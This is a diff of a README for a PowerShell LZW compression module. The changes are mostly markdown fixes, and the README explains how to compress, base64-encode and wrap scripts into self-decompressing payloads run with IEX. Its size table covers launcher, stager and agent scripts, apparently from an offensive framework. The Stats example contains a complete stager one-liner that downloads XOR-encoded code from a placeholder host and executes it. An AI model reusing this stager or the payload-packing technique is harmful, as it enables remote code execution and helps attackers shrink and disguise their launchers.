@@ -76,7 +76,8 @@ To use LZW it's simple :
 
 1/ Declare functions (or import-module PoshLZW.ps1)
 
-```PS> $m_=[math];
+```
+$ PS> $m_=[math];
 $ PS > function bs{...
 $ PS > function bw{...
 $ PS > function lzwc{...
@@ -85,17 +86,20 @@ $ PS > function lzwc{...
 
 2/ compress your powershell script :
 
-```PS> $MyScript = "write-host 'Hello World';";
+```
+$ PS> $MyScript = "write-host 'Hello World';";
 $ PS > $lz = lzwc $MyScript 10;
 ```
 
 3/ encode the compressed script in base64
-```$ PS > $lz64 = [convert]::ToBase64String($lz);
+```
+$ PS > $lz64 = [convert]::ToBase64String($lz);
 ```
 
 
 4/ Build the payload with the overhead :
-```PS> $payload = '$m_=[math];';
+```
+$ PS> $payload = '$m_=[math];';
 $ PS > $payload+= 'function bs{...' + 'function br{...' + 'function lzwd{...';
 $ PS > $payload+= 'IEX(lzwd ([byte[]]([System.Convert]::FromBase64String("'+$lz64+'"))))';
 ```
@@ -116,7 +120,7 @@ A way to use compression could be to run "powershell -c H+B64(LZW(T,9))"
 
  
 |                      | Launcher | Stager |  Agent  |
-|----------------------|----------|--------|---------|
+|---------------------:|---------:|-------:|--------:|
 |       Text as T      |   418    |  4 909 |  44 041 |
 |           B64(T)     | 1 116    | 13 092 | 117 444 |
 |           LZW(T,9)   |   387    |  3 740 |  27 878 |
@@ -147,7 +151,8 @@ Example
 -------
 
 Stats
-````$ PS > $text = '$Wc=NEW-ObjEcT SYStEM.Net.WEBCliENT;$u="Test/5.0 (Windows NT 5.1; Trident/1.0;) like Gecko";$wc.HeADerS.ADD("User-Agent",$u);$wc.ProXY = [SYSTem.Net.WEBREQuEsT]::DEFAulTWebPROXY;$WC.PRoxy.CReDEnTIaLS = [SYStEM.NET.CRedEnTiALCACHe]::DEFAulTNetwORKCredenTiaLs;$K="aaaaaaaabbbbbbbbcccccccceeeeeeee";$I=0;[chAr[]]$b=([CHAr[]]($wC.DowNlOaDSTRing("http://1.2.3.4:80/index.asp")))|%{$_-BXoR$k[$i++%$k.LeNgTH]};IEX ($B-jOIn"")';
+```
+$ PS > $text = '$Wc=NEW-ObjEcT SYStEM.Net.WEBCliENT;$u="Test/5.0 (Windows NT 5.1; Trident/1.0;) like Gecko";$wc.HeADerS.ADD("User-Agent",$u);$wc.ProXY = [SYSTem.Net.WEBREQuEsT]::DEFAulTWebPROXY;$WC.PRoxy.CReDEnTIaLS = [SYStEM.NET.CRedEnTiALCACHe]::DEFAulTNetwORKCredenTiaLs;$K="aaaaaaaabbbbbbbbcccccccceeeeeeee";$I=0;[chAr[]]$b=([CHAr[]]($wC.DowNlOaDSTRing("http://1.2.3.4:80/index.asp")))|%{$_-BXoR$k[$i++%$k.LeNgTH]};IEX ($B-jOIn"")';
 $ PS > #$text = [System.Text.Encoding]::ASCII.GetString([System.IO.File]::ReadAllBytes("stager.ps1"));
 $ PS > #$text = [System.Text.Encoding]::ASCII.GetString([System.IO.File]::ReadAllBytes("agent.ps1"));
 $ PS > write-host "|                 Text   |" $text.length
@@ -162,7 +167,7 @@ $ PS > 	write-host "|     H+B64(LZW(T,$i)  |" $overhead.length;
 $ PS > 	$b64hz = [convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($overhead));
 $ PS > 	write-host "| B64(H+B64(LZW(T,$i)) |" $b64hz.length;
 $ PS > }
-````
+```
 
 Last word ?
 -----------
